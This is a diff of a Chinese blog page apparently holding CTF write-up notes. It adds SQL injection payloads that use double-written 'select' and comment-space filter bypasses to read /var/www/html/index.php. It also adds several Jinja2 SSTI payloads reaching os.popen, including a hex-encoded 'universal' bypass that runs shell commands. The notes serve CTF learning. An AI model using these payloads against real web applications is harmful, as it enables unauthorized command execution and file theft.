@@ -376,7 +376,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 4 分钟
                 </time>
             </div>
         
@@ -422,9 +422,17 @@
 <h2 id="ezsql10">ezsql1.0
 </h2><h3 id="考点其实就是双写绕过select绕过空格">考点其实就是双写绕过select，/**/绕过空格
 </h3><p>此题竟然是双写绕过select,我怎么说盲注的时候select database()可以，其它不行。由于替换了select，一度让我以为过滤了union</p>
-<p>，不可以打联合注入。</p>
+<p>，不可以打联合注入。结果复现的时候发现可以打</p>
 <h3 id="联合注入">联合注入
 </h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="o">/**/</span><span class="n">union</span><span class="o">/**/</span><span class="n">seselectlect</span><span class="o">/**/</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/var/www/html/index.php&#39;</span><span class="p">)</span><span class="c1">#复现完后尝试读了下源码</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -456,7 +464,8 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1/**/union/**/seselectlect/**/1,2,group_concat(id,title,content)%09from%09xuanyuanCTF.info
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="布尔盲注">布尔盲注
+</div><img src="image-20250521224640151.png" alt="image-20250521224640151" style="zoom:50%;" />
+<h3 id="布尔盲注">布尔盲注
 </h3><p>这里空格绕过倒是简单，一试就出来了。现在将题目重新推一遍</p>
 <p>首先试一下，数字型，布尔盲注和时间盲注都可以打，差不多，这里就打布尔盲注吧</p>
 <div class="highlight"><div class="chroma">
@@ -468,7 +477,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=1/**/and/**/1=1   #有回显
 </span></span><span class="line"><span class="cl">id=1/**/and/**/1&gt;1	#无回显
-</span></span><span class="line"><span class="cl">id=1/**/and/**/1&gt;1select #发现这个都有回显，那说明select被替换成空了
+</span></span><span class="line"><span class="cl">id=1/**/and/**/1&gt;1select #发现这个都有回显，那说明select被替换成空了,这个语句测试是否关键词被替换,是否要双写绕很好
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="/p/2025-%E8%BD%A9%E8%BE%95ctf/image-20250521195540078.png"
@@ -632,7 +641,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><img src="image-20250521223649978.png" alt="image-20250521223649978" style="zoom:50%;" />
-<p>这里主要是学到了盲注读源码，这样以后方便多了</p>
+<p>这里主要是学到了盲注读源码，这样以后方便多了,也学到了关键词被替换测试的方法</p>
 <h2 id="ezjs">ezjs
 </h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -700,7 +709,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="ezflask">ezflask
-</h2><div class="highlight"><div class="chroma">
+</h2><p>fuzz一下，主要lipsum,cycler，点和一些关键词被过滤了，那就用get_flashed_messages，点过滤用[],关键词就分号</p>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -720,7 +730,38 @@
 </span></span><span class="line"><span class="cl">()}}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>上面手动构造，有点问题，第一个可以跑，第二个跑部了？？直接fenjin跑</p>
+</div><p>手动构造，有点问题，第一个payload可以跑，第二个跑不了？？仔细一看，原来是命令被替换为空,那又引号绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{get_flashed_messages[&#34;__globals__&#34;][&#34;o&#34;&#34;s&#34;][&#34;pop&#34;+&#34;en&#34;](&#34;t&#34;&#34;ac /f???&#34;)[&#34;re&#34;&#34;ad&#34;]
+</span></span><span class="line"><span class="cl">()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250521234936166.png" alt="image-20250521234936166" style="zoom:50%;" />
+<p>其实这里还要很多可以用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{joiner[&#34;__init__&#34;][&#34;__globals__&#34;][&#34;o&#34;&#34;s&#34;][&#34;pop&#34;+&#34;en&#34;](&#34;t&#34;&#34;ac /f???&#34;)[&#34;re&#34;&#34;ad&#34;]
+</span></span><span class="line"><span class="cl">()}}
+</span></span><span class="line"><span class="cl">{{namespace[&#34;__init__&#34;][&#34;__globals__&#34;][&#34;o&#34;&#34;s&#34;][&#34;pop&#34;+&#34;en&#34;](&#34;t&#34;&#34;ac /f???&#34;)[&#34;re&#34;&#34;ad&#34;]
+</span></span><span class="line"><span class="cl">()}}
+</span></span><span class="line"><span class="cl">{{url_for[&#34;__globals__&#34;][&#34;o&#34;&#34;s&#34;][&#34;pop&#34;+&#34;en&#34;](&#34;t&#34;&#34;ac /f???&#34;)[&#34;re&#34;&#34;ad&#34;]
+</span></span><span class="line"><span class="cl">()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这题可以直接fenjin跑</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -730,7 +771,28 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><img src="image-20250521114535537.png" alt="image-20250521114535537" style="zoom:50%;" />
-<h1 id="密码">密码
+<p>我尝试造一个可以绕过差不多大部分的万能payload,这个舍弃了lipsum与cycler这中常用的函数，而且编码绕过了下划线与点，除非它过滤了引号或者数字或者/</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">原型：{{joiner.__init__.__globals__.os.popen(&#39;ls /&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{joiner[&#34;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#34;][&#34;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#34;][&#34;\x6f\x73&#34;][&#34;\x70\x6f\x70\x65\x6e&#34;](&#34;ls /&#34;)[&#34;\x72\x65\x61\x64&#34;]()}}	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{{joiner[&#34;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#34;][&#34;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#34;][&#34;\x6f\x73&#34;][&#34;\x70\x6f\x70\x65\x6e&#34;](&#34;t&#34;&#34;ac /f*&#34;)[&#34;\x72\x65\x61\x64&#34;]()}}	
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="密码">密码
 </h1><h2 id="简单编码">简单编码
 </h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
